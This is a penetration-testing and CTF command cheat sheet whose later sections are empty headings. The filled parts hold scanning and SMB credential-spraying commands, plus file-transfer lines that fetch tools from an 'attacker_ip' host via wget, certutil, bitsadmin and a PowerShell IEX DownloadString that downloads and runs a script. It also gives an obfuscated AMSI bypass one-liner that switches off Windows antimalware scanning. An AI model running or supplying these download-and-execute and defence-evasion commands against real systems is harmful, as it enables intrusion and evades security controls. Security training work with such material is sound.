# Common Commands Reference
This is a cheat sheet of common and useful commands I use for CTFs and Penetration Tests.

Prereqs:
Download and install my tools from here:
- https://github.com/Z333RO/security-tools-public/blob/main/kali_autosetup/1st_download_tools_payloads.sh
- https://github.com/Z333RO/security-tools-public/blob/main/kali_autosetup/2nd_update_install.sh

# Web Enumeration 
## dirb
```
dirb http://172.0.0.1/
dirb http://172.0.0.1/ /path/to/wordlist.txt
```

## ffuf
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://192.10.10.10/FUZZ -recursion -recursion-depth 1 -e .php -v 
```

## gobuster
```
gobuster -k -u https://10.10.10.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,asp,aspx,html -t 40
```

## dirsearch

```
sudo dirsearch -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.13/ -e all -t 50
```

# Network Enumeration 
## rustscan
```
Scan all ports
rustscan -a 10.10.10.13 --ulimit 5000 --range 1-65535 -- -sVC -Pn
rustscan -a 10.10.10.0/24 --ulimit 5000 --range 1-65535 -- -sVC -Pn
```

## nmap 
```
nmap -sVC 10.10.10.13
nmap -sVC 10.10.10.0/24
```

## crackmapexec
```
crackmapexec smb 10.10.10.0/24 -u '' -p '' --shares
crackmapexec smb 10.10.110.0/24 -u users.txt -p password.txt continue-on-success

```

# Common and Useful Exploit Methods - Footholds
## File Upload - Reverse Shells 


# File Transfer Methods
## Linux - wget
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE
wget http://atacker_ip:80/name_of_file.php
```

## Windows - certutil
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE
certutil -urlcache -f http://attacker_ip:80/name_of_file.exe
```

## Windows - powershell
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE (various commands by line - pick what you want)
powershell wget http://attacker_ip/nc.exe -outfile nc.exe

# Run "powershell -ep bypass" first
IEX (New-Object Net.WebClient).DownloadString("http://attacker_ip/PowerView.ps1")
```

## Windows - LOLBAS
```
bitsadmin.exe /transfer /Download /priority Foreground http://attacker_IP:80/name_of_file.exe
```

# Local Enumeration for Privesc
## Linux
### Linpeas

### Linux Exploit Suggester

### PsPY


## Windows
### Winpeas

### Windows Exploit Suggester

# Common and Useful Exploit Methods - PrivEsc
## PwnKit

## Kernel Exploits

## Potatoes


# Post Exploitation 
## Mimikatz

## LaZagne

## Snaffler

## Bloodhound

# AV Bypass Techniques

## AMSI Bypass
Paste this into the command line and run before executing powershell scripts:
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; (Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```


# Pivoting

## SSH Tunneling 

## Chisel

## Metasploit Proxy

# Misc Commands

